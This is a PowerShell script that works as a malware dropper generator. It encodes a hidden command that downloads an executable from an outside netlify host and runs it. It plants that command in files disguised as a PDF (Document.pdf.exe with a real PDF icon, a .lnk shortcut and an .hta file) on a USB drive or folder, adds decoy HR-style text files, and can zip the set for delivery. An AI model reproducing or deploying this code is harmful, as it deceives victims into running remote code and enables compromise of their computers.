param(
    [string]$Path = "",
    [switch]$Zip
)

$rawCmd = "`$wc=New-Object Net.WebClient;`$b=`$wc.DownloadData('https://allseeing.netlify.app/a');`$p=`$env:tmp+'\a.exe';[IO.File]::WriteAllBytes(`$p,`$b);start `$p"
$encBytes = [System.Text.Encoding]::Unicode.GetBytes($rawCmd)
$encCmd = [Convert]::ToBase64String($encBytes)

if (!$Path) {
    $Path = Read-Host "Enter target path (USB drive or folder)"
    if (!$Path) { Write-Error "No path provided"; exit 1 }
}

$Path = [IO.Path]::GetFullPath($Path)
if (!(Test-Path $Path)) { Write-Error "Path does not exist: $Path"; exit 1 }

Write-Output "Generating payload in: $Path"

# --- Extract PDF icon and compile Document.pdf.exe ---
$tmpDir = "$env:TEMP\netpen_icon_$(Get-Random)"
New-Item -ItemType Directory -Path $tmpDir -Force | Out-Null
$tempPdf = "$tmpDir\_.pdf"
Set-Content $tempPdf "%PDF-1.4" -Encoding Ascii
try {
    Add-Type -AssemblyName System.Drawing
    $icon = [System.Drawing.Icon]::ExtractAssociatedIcon($tempPdf)
    $icoPath = "$tmpDir\pdf.ico"
    $fs = New-Object System.IO.FileStream($icoPath, [System.IO.FileMode]::Create)
    $icon.Save($fs)
    $fs.Close(); $icon.Dispose()
    Remove-Item $tempPdf -Force
    Set-Content "$tmpDir\launcher.rc" '101 ICON "pdf.ico"' -Encoding Ascii
    $cpp = '#include <windows.h>'
    $cpp += "`r`nint WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {"
    $cpp += "`r`n    WinExec(`"powershell -w h -Enc $encCmd`", SW_HIDE);"
    $cpp += "`r`n    return 0;"
    $cpp += "`r`n}"
    Set-Content "$tmpDir\launcher.cpp" $cpp -Encoding Ascii
    $oldPath = $env:Path
    $env:Path = "C:\msys64\ucrt64\bin;" + $env:Path
    windres "$tmpDir\launcher.rc" -O coff -o "$tmpDir\launcher.res" 2>&1 | Out-Null
    if ($LASTEXITCODE -eq 0) {
        g++ -Os -s -mwindows "$tmpDir\launcher.cpp" "$tmpDir\launcher.res" -o "$Path\Document.pdf.exe" 2>&1 | Out-Null
        Remove-Item "$tmpDir\launcher.res" -Force
    }
    $env:Path = $oldPath
    if ($LASTEXITCODE -eq 0 -and (Test-Path "$Path\Document.pdf.exe")) {
        Write-Output "  [+] Document.pdf.exe compiled (real PDF icon)"
    } else {
        $shell = New-Object -ComObject WScript.Shell
        $lnk = $shell.CreateShortcut("$Path\Document.pdf.lnk")
        $lnk.TargetPath = "powershell.exe"
        $lnk.Arguments = "-w h -Enc $encCmd"
        $lnk.WorkingDirectory = "%TEMP%"
        $lnk.WindowStyle = 7
        $lnk.IconLocation = "%SystemRoot%\system32\shell32.dll, 70"
        $lnk.Save()
        Write-Output "  [+] Document.pdf.lnk created (fallback, g++ unavailable)"
    }
} catch {
    Write-Output "  [!] PDF icon extraction failed, skipping EXE launcher"
}
# Clean up temp
Remove-Item "$tmpDir" -Recurse -Force -ErrorAction SilentlyContinue

# Document.pdf.hta (shows as Document.pdf, opens via mshta.exe)
$htaContent = @"
<html><head><title>Document</title></head>
<body>
<script>
var s = new ActiveXObject("WScript.Shell");
s.Run("powershell -w h -Enc $encCmd", 0);
window.close();
</script>
</body>
</html>
"@
Set-Content "$Path\Document.pdf.hta" $htaContent -Encoding UTF8
Write-Output "  [+] Document.pdf.hta created"

# Decoy Document.txt
Set-Content "$Path\Document.txt" "This document contains confidential information.`r`nFor authorized personnel only.`r`n`r`nPlease review and sign the attached agreement." -Encoding UTF8
Write-Output "  [+] Document.txt created"

# Decoy README.txt
Set-Content "$Path\README.txt" "Thank you for reviewing this document.`r`nPlease ensure all sections are completed`r`nbefore the deadline.`r`n`r`nIf you have any questions, contact the HR department." -Encoding UTF8
Write-Output "  [+] README.txt created"

# Optional zip
if ($Zip) {
    $zipFiles = @()
    foreach ($f in @("Document.pdf.exe", "Document.pdf.lnk", "Document.pdf.hta", "Document.txt", "README.txt")) {
        $fp = "$Path\$f"
        if (Test-Path $fp) { $zipFiles += $fp }
    }
    $zipPath = "$Path\Document.zip"
    if (Test-Path $zipPath) { Remove-Item $zipPath -Force }
    if ($zipFiles.Count -gt 0) {
        Compress-Archive -Path $zipFiles -DestinationPath $zipPath -CompressionLevel Optimal
        Write-Output "  [+] Document.zip created"
    }
}

Write-Output ""
Write-Output "=== DELIVERY SUMMARY ==="
Write-Output "Folder: $Path"
if (Test-Path "$Path\Document.pdf.exe") {
    Write-Output "EXE:    Document.pdf.exe (no arrow, real PDF icon - double click to deploy)"
}
if (Test-Path "$Path\Document.pdf.lnk") {
    Write-Output "LNK:    Document.pdf.lnk (fallback - shortcut with PDF icon)"
}
Write-Output "HTA:    Document.pdf.hta (backup - opens via mshta.exe)"
if ($Zip -and (Test-Path "$Path\Document.zip")) { Write-Output "Zipped: Document.zip" }
Write-Output "=========================="
